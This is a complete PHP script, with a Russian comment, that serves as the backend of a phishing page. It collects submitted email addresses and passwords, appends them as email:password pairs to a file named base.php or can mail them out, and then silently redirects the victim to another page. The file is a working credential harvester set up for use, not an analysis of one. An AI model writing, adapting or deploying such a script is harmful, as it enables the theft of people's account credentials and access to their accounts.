<?php
/*
В LOCATION можно изменить переадресацию.

*/
$BASE="base.php";
$IS_EMAIL=false;
$LOCATION="good.php";

$p0=$_REQUEST["login"];
$p1=$_REQUEST["email"];
$p2=$_REQUEST["pass"];
$headers = "";
$info="$p1:$p2\n";

if ($IS_EMAIL){
mail($BASE, "*** Вам пришёл сюрприз!", $headers.$info);
} else {
$fd=fopen($BASE,"a+");
fwrite($fd,$info);
fclose($fd);
}

header("Location:$LOCATION");
?>
